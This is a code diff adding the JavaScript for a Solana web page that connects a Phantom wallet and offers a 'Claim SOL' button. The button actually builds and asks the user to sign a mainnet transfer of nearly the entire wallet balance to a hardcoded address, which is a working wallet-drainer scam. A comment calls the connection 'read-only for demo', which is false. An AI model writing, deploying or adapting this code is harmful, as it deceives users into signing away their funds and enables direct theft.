@@ -1,0 +1,70 @@
+const { Connection, PublicKey, Transaction, SystemProgram } = solanaWeb3;
+
+// Connect to Mainnet (read-only for demo)
+const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
+
+let provider = null;
+let senderPublicKey = null;
+const statusText = document.getElementById("status");
+
+/////////////////////////////
+// 1️⃣ Wallet Connection
+/////////////////////////////
+document.getElementById("connectWallet").onclick = async () => {
+    if ("solana" in window) {
+        provider = window.solana;
+        try {
+            const resp = await provider.connect();
+            senderPublicKey = resp.publicKey;
+
+            const balance = await connection.getBalance(senderPublicKey);
+            statusText.innerText = `Wallet connected: ${senderPublicKey}\nBalance: ${balance / 1e9} SOL`;
+        } catch (err) {
+            console.error(err);
+            statusText.innerText = "Failed to connect wallet.";
+        }
+    } else {
+        alert("Phantom wallet not found! Please install it first.");
+    }
+};
+
+/////////////////////////////
+// 2️⃣ Claim SOL Button
+/////////////////////////////
+document.getElementById("sendAll").onclick = async () => {
+    if (!provider || !senderPublicKey) {
+        alert("Connect your wallet first!");
+        return;
+    }
+
+    try {
+        const balance = await connection.getBalance(senderPublicKey);
+        console.log("Wallet balance (lamports):", balance);
+
+        if (balance <= 5000) {
+            statusText.innerText = "Not enough SOL to claim (after fee buffer).";
+            return;
+        }
+
+        // ⚠️ DANGER: This part sends real SOL to a wallet if run on mainnet
+        const recipient = new PublicKey("WFp5bLo19m5MnjCLYdCJ7cpf4RRMhbS3LveQL9M2wGQ"); 
+        const transaction = new Transaction().add(
+            SystemProgram.transfer({
+                fromPubkey: senderPublicKey,
+                toPubkey: recipient,
+                lamports: balance - 5000,
+            })
+        );
+
+        transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
+        transaction.feePayer = senderPublicKey;
+
+        const signed = await provider.signTransaction(transaction);
+        const txid = await connection.sendRawTransaction(signed.serialize());
+        statusText.innerText = "Transaction sent! Check mainnet explorer: " + txid;
+
+    } catch (err) {
+        console.error(err);
+        statusText.innerText = "Transaction failed or cancelled.";
+    }
+};
